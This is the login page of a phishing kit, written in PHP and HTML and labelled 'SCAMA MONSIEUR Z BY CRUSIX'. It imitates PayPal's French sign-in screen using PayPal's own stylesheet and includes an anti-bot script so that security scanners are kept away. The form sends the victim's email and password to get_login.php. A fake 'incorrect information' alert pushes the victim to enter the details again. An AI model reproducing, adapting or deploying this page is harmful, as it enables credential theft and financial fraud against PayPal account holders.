

<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
LOGIN.PHP
*/
include('../ANTIBOTS/antibots.php');
?>
<html lang="fr" ><!--<![endif]--><head><!--Script info: script: node, template:  , date: Jul 25, 2020 07:50:43 -07:00, country: FR, language: fr web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0YR0FbvdGDu/+LEe4i66H0ir37Ha3IJ1y rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfStNc1z8whYDIP0%2FkcJ6Y%2FpYrnzz0wcBIl4kaaZDoGeZ_17386746c5b --><meta charset="utf-8"><title>Connectez-vous à votre compte</title><meta http-equiv="content-type" content="text/html; charset=UTF-8">


    <link rel="shortcut icon" href="../ressources/favicon.ico"><link rel="apple-touch-icon" href="../ressources/pp64.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes"><meta property="og:image" content="../ressources/pp258.png">

    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/84d/8e566046daeaa380ed72d47392150/css/contextualLogin.css">
<style>
body {
overflow: hidden;
}
</style>


</head>
<body class="desktop" >

    
    <div id="main" class="main" role="main"><section id="login" class="login " data-role="page" data-title="Connectez-vous à votre compte PayPal"><div class="corral">
        <div id="content" class="contentContainer activeContent contentContainerBordered"><header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">
        </p>

    </header>

    <h1 id="headerText" class="headerText  accessAid">Connectez-vous à votre compte PayPal</h1>
    
<form action="get_login.php" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate="">

<?php
if(strpos($_SERVER['REQUEST_URI'],'error=true'))
{
echo'<div class="notifications"><p class="notification notification-critical" role="alert">Certaines de vos informations sont incorrectes. Réessayez.</p></div>';
}
?>

    <div id="passwordSection" class="clearfix splitEmail">

        <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">

            

            <div class="textInput" id="login_emaildiv">

                <div class="fieldWrapper ">

                    <label for="email" class="fieldLabel">Email</label>

                    <input id="email" name="mail" type="email" class="hasHelp  validateEmpty   "  value="" autocomplete="username" placeholder="Email" aria-describedby="emailErrorMessage" required>

                </div>

                <div class="errorMessage" id="emailErrorMessage">

                    <p class="emptyError hide">Obligatoire</p>

                    <p class="invalidError hide">Le format de cette adresse email ou de ce numéro de mobile n'est pas correct</p>

                </div>

            </div>

        </div>

        <div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv">

            <div class="fieldWrapper ">

                <label for="password" class="fieldLabel">Mot de passe</label>

                <input id="password" name="pass" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Mot de passe" aria-describedby="passwordErrorMessage">

                <label for="Afficher le mot de passe" class="fieldLabel">Afficher le mot de passe</label>

                <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Afficher le mot de passe" pa-marked="1">Afficher</button>

                <label for="Masquer" class="fieldLabel">Masquer</label>

                <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Masquer" pa-marked="1">Masquer</button>

                <button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button>

            </div>

            <div class="errorMessage" id="passwordErrorMessage">

                <p class="emptyError hide">Entrez votre mot de passe.</p></div></div></div></div>

                <div class="actions">

                    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Connexion</button>

                </div>

                <input type="hidden" name="splitLoginContext" value="inputPassword"><input type="hidden" name="isCookiedHybridEmail" value="true"><input type="hidden" name="partyIdHash" value="619ff1e381b2c4c45e138e6c4bb51aae9a4da377f2682d58eafa68d1664c26e7">
            </form>

            

        

            

                <div class="pwr-modal forgotPasswordModal" id="password-recovery-modal">

                

                    <div class="monogram-small"></div></div><div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass=""><div class="loginSignUpSeparator "><span class="textInSeparator">ou</span></div><a role="button" href="" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Ouvrir un compte</a></div><div id="tpdButtonContainer" class="signupContainer hide"><div class="loginSignUpSeparator"><span class="textInSeparator">ou</span></div>

                
                </div>
            </div>
        </section><footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li><a target="_blank" href="#" pa-marked="1">Contact</a></li><li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a></li><li><a target="_blank" href="" pa-marked="1">Contrats d'utilisation</a></li><li><a target="_blank" href="#" pa-marked="1">International</a></li></ul></div></footer>


                </body>